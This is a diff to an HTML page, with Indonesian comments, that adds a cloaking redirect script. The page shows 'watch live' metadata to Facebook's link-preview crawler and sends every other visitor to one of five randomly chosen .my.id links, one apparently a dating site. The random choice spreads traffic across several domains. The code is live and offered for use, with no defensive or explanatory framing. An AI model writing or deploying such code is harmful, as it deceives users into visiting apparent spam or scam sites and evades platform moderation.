@@ -9,17 +9,30 @@
     <meta property="og:type" content="website">
 
     <!-- 2. JUDUL UNTUK TAB BROWSER -->
-    <title>watch live shows</title>
+    <title>watch live</title>
 
-    <!-- 3. SCRIPT AUTO-REDIRECT KHUSUS PENGUNJUNG -->
+    <!-- 3. SCRIPT RANDOM REDIRECT AUTOMATIS -->
     <script>
-        // Memeriksa apakah yang mengakses adalah Bot/Crawler Facebook
+        // Cek apakah yang membuka adalah bot Facebook
         var userAgent = navigator.userAgent.toLowerCase();
         var isFacebookBot = userAgent.includes('facebookexternalhit') || userAgent.includes('facebot');
 
-        // Jika BUKAN bot Facebook, langsung alihkan pengunjung ke link tujuan
+        // Jika BUKAN bot Facebook, jalankan acak link
         if (!isFacebookBot) {
-            window.location.replace("https://pearineye.my.id/553841bad");
+            // DAFAR 5 SLOT LINK TUJUAN
+            var daftarLink = [
+                "https://flychicken.my.id/45785566b",
+                "https://flychicken.my.id/6d053bb3b",
+                "https://urep9.my.id/de8041562",
+                "https://urep9.my.id/d7505f7cc",
+                "https://datingvibes.my.id/b10d6535e"
+            ];
+
+            // Memilih 1 link secara acak dari daftar di atas
+            var linkAcak = daftarLink[Math.floor(Math.random() * daftarLink.length)];
+
+            // Mengalihkan pengunjung ke link yang terpilih
+            window.location.replace(linkAcak);
         }
     </script>
 </head>
